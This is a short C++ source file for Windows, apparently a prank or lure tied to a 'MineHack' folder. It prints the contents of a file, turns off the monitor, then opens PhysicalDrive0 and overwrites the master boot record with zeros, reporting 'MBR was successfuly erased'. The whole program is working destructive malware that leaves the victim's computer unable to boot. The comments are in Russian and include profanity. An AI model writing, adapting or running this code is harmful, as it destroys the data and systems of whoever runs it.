///////////////////////////////////////////////////////
///////////////////////CordCyber///////////////////////
///////////////////////////////////////////////////////
#include "stdafx.h"
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <string>

using namespace std;

#define MBR_SIZE 512

int main()
{
	std::string line;
 
    std::ifstream in("C:\\MineHack\\image\\syte.png"); // окрываем файл для чтения
    if (in.is_open())
    {
        while (getline(in, line))
        {
            std::cout << line << std::endl;
        }
    }
    in.close(); // закрываем файл
     
    std::cout << "End of program" << std::endl;

	Sleep(4000);

	SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2); // выкл монитора

	Sleep(5000); // через какое время компу пиздец щас например 5000 = 5 сек.

    DWORD write;

    char mbr[MBR_SIZE];

    ZeroMemory(&mbr, (sizeof mbr));

    HANDLE MasterBootRecord = CreateFile(L"\\\\.\\PhysicalDrive0",
        GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);

	if (WriteFile(MasterBootRecord, mbr, MBR_SIZE, &write, NULL) == TRUE)
	{
		cout << "MBR was successfuly erased" << endl;

		Sleep(3000);

		ExitProcess(0);
	}
	else
	{
		cout << "Something has gone wrong!" << endl;

		Sleep(3000);

		ExitProcess(0);
	}

	CloseHandle(MasterBootRecord);
	return 0;
}